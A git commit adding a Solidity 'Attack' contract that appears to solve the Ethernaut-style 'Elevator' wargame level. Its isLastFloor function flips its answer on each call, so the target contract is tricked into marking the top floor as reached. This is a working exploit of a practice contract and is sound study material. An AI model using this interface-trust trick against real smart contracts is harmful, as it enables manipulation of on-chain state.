1176b1c7e7d58a40984271baf5238e840b8364df
donghyeon <tsvz1234@gmail.com>
2024-07-09 21:57:22 +0900

    Update solve.sol

--- Elevator/solve.sol
+++ Elevator/solve.sol
@@ -1,1 +1,21 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+import "./Elevator.sol";
 
+contract Attack {
+    bool public test;
+    Elevator public elevator;
+    constructor (address _address) {
+        elevator = Elevator(_address);
+        test = true;
+    }
+
+    function isLastFloor(uint256) external returns (bool) {
+        test = !test;
+        return test;
+    }
+
+    function attack() public {
+        elevator.goTo(10);
+    }
+}
